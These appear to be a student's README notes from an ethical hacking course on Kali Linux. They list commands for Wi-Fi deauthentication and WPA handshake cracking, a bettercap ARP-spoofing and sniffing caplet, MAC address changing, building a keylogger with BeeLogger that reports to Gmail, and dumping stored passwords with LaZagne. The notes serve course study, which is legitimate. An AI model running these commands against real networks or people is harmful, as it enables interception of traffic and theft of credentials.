# udemy-ethical_hacking_kali_linux
## Udemy - Ethical Hacking With Python, JavaScript and Kali Linux  

### In Kali Linux use next introduction tools:  
netdiscover -i eth0 -r 10.0.2.1/24  
zenmap     --> better tool to scan the network (uses nmap as a core command)  
airmon-ng  --> wlan tool that makes possible to cahange status from Managed to Monitor mode  
iwconfig wlan0 mode monitor  --> manually change mode to Monitor (used after executing "ifconfig wlan0 down/up")  
  
fern --> GUI application to crack WI-FI  
airodump-ng --bssid --channel 6 --write demo-handshake wlan0mon  --> capturing connection handshake  
aireplay-ng --deauth 4 -a (BSSID) -c (STA) wlan0mon  --> force disconnect station and capture with previous app WPA handshake  
aircrack-ng demo-handshake-01.cap -w wordlist  --> will crack demo-handshake against generated wordlist  
  
### In Kali linux try introduction for "bettercap":  

sudo bettercap  --> enter to the console of application  
help            --> to see which modules are available/enabled  
help net.probe  --> will send UDP packets to probe the network on connected devices  
net.probe on    --> turn it on  
help arp.spoof  -->  
set arp.spoof.fullduplex true   --> Will attack the target and the Gateay, this will ensure that if there is protection in GTW, the attack will succeed.  
set arp.spoof.targets 10.0.2.4  --> Adding the target to monitor.  
arp.spoof on    --> enable the spoof service  
set net.sniff.local true  --> If true, will consider packets from/to computer as local.  
net.sniff on    --> enable the sniffing service  


vim sniff.cap  
----------------------------  
net probe on  
set arp.spoof.fullduplex true  
set arp.spoof.targets 10.0.2.4  
set net.sniff.local true  
arp.spoof on  
net.sniff on  
----------------------------  
bettercap -iface eth0 -caplet sniff.cap  --> will do manual job as auto.  

### To change MAC Address of your adapter do next:  
ifconfig wlan0 down  
ifconfig wlan0 hw ether 00:11:22:33:44:55  
ifconfig wlan0 up  

### Create a logger with reports to be sent to your dedicated Gmail
git clone https://github.com/4w4k3/BeeLogger.git
install on your kali-linux
create a new dedicated Gmail account with this enabled https://www.google.com/settings/security/lesssecureapps

### Retrieve locally stored passwords on your host with LaZagne
git clone https://github.com/AlessandroZ/LaZagne.git
pip install -r requirements.txt
laZagne.exe all       (Launch all modules)
LaZagne.exe browsers  (will show you found local passwords)

